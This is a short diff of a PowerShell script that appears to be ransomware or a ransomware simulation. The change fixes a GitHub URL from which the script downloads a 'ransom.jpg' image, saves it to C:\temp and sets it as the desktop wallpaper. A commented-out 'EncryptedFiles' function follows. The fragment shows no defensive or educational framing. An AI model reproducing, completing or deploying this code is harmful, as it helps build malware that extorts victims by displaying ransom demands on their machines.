@@ -74,10 +74,10 @@ public class Params
     $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
 }
 
-$ransom = "https://raw.githubusercontent.com/ecoterror443/filerep/main/ransom.jpg"
+$ransom = "https://raw.githubusercontent.com/ecoterror443/filerepo/main/ransom.jpg"
 Invoke-WebRequest -Uri $ransom -OutFile "c:/temp/ransom.jpg"
  
-Set-WallPaper -Image "C:\temp\ransom.jpg" -Style Stretch | Out-Null
+Set-WallPaper -Image "C:\temp\ransom.jpg" -Style Stretch
 
 # Start-Sleep 3
 # function EncryptedFiles 
